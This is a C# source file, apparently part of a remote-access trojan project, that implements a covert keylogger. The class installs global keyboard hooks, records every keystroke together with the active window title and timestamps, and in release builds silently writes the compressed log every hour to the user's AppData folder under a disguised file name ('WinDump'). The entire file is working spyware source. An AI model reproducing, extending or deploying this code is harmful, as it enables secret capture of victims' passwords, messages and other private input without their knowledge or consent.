using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using BlackHole.Common;
using BlackHole.Common.Extentions;
using BlackHole.Slave.Helper;
using Gma.System.MouseKeyHook;

namespace BlackHole.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public class Keylogger : Singleton<Keylogger>, IMalicious
    {
        private static readonly string FileName = "WinDump_{0}.bin";

#if DEBUG
        /// <summary>
        /// 
        /// </summary>
        public static string FileDirectory => "";
        public const int FLUSH_INTERVAL = 70000;
#else
        /// <summary>
        /// 
        /// </summary>
        public static string FileDirectory => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public const int FLUSH_INTERVAL = 60000 * 60;
#endif

        private readonly StringBuilder m_logger = new StringBuilder();
        private readonly List<Keys> m_pressedKeys = new List<Keys>();
        private readonly List<char> m_pressedKeyChars = new List<char>();
        private string m_lastWindowTitle = string.Empty;
        private bool m_ignoreSpecialKeys;
        private IKeyboardMouseEvents m_events;
        
        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            Subscribe(Hook.GlobalEvents());

            Task.Factory.StartNew(WriteFile, TaskCreationOptions.LongRunning);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="events"></param>
        private void Subscribe(IKeyboardMouseEvents events)
        {
            m_events = events;
            m_events.KeyDown += OnKeyDown;
            m_events.KeyUp += OnKeyUp;
            m_events.KeyPress += OnKeyPress;
        }

        /// <summary>
        /// 
        /// </summary>
        private void Unsubscribe()
        {
            if (m_events == null)
                return;
            m_events.KeyDown -= OnKeyDown;
            m_events.KeyUp -= OnKeyUp;
            m_events.KeyPress -= OnKeyPress;
            m_events.Dispose();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Append(object message) => m_logger.Append(message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void AppendLine(object message) => m_logger.AppendLine(message.ToString());

        /// <summary>
        /// 
        /// </summary>
        private void AppendNewWindowName() =>
            AppendLine($"\n[{m_lastWindowTitle}][{DateTime.Now.ToString("HH:mm")}]");

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnKeyDown(object sender, KeyEventArgs e) 
        {
            var windowTitle = KeyloggerHelper.GetActiveWindowTitle(); 
            if(!string.IsNullOrEmpty(windowTitle) && (m_lastWindowTitle != windowTitle))
            {
                m_lastWindowTitle = windowTitle;
                AppendLine(string.Empty);
                AppendNewWindowName();
            }
            
            if (m_pressedKeys.IsModifierKeysSet())            
                if (!m_pressedKeys.Contains(e.KeyCode))
                {
                    m_pressedKeys.Add(e.KeyCode);
                    return;
                }            

            if (!e.KeyCode.IsExcludedKey())
                if (!m_pressedKeys.Contains(e.KeyCode))                
                    m_pressedKeys.Add(e.KeyCode);                            
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnKeyPress(object sender, KeyPressEventArgs e) 
        {
            if (m_pressedKeys.IsModifierKeysSet() && m_pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!m_pressedKeyChars.Contains(e.KeyChar) || !KeyloggerHelper.DetectKeyHolding(m_pressedKeyChars, e.KeyChar)) && !m_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                if (m_pressedKeys.IsModifierKeysSet())
                    m_ignoreSpecialKeys = true;

                m_pressedKeyChars.Add(e.KeyChar);
                Append(e.KeyChar);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
        {
            Append(HighlightSpecialKeys(m_pressedKeys.ToArray()));
            m_pressedKeyChars.Clear();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="keys"></param>
        /// <returns></returns>
        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!m_ignoreSpecialKeys)
                {
                    names[i] = KeyloggerHelper.GetDisplayName(keys[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    m_pressedKeys.Remove(keys[i]);
                }
            }

            m_ignoreSpecialKeys = false;

            if (m_pressedKeys.IsModifierKeysSet())
            {
                var specialKeys = new StringBuilder();
                var validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    m_pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i]))
                        continue;

                    specialKeys.AppendFormat(validSpecialKeys == 0 ? @"[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }
                
                if (validSpecialKeys > 0)
                    specialKeys.Append("]");

                return specialKeys.ToString();
            }

            var normalKeys = new StringBuilder();
            for (int i = 0; i < names.Length; i++)
            {
                m_pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i]))
                    continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"[Enter]");
                        break;
                    case "Escape":
                        normalKeys.Append(@"[Esc]");
                        break;
                    default:
                        normalKeys.Append(@"[" + names[i] + "]");
                        break;
                }
            }
            return normalKeys.ToString();
        }

        /// <summary>
        /// 
        /// </summary>
        private async void WriteFile()
        {
            var filePath = Path.Combine(FileDirectory, FileName);

            try
            {
                File.WriteAllBytes(string.Format(filePath, DateTime.Now.ToString("dd_HH_mm")), Encoding.Default.GetBytes(m_logger.ToString()).CompressLz4());
                m_logger.Clear();
            }
            catch
            {
            }

            await Task.Delay(TimeSpan.FromMilliseconds(FLUSH_INTERVAL));
            await Task.Factory.StartNew(WriteFile, TaskCreationOptions.LongRunning);
        }
    }
}
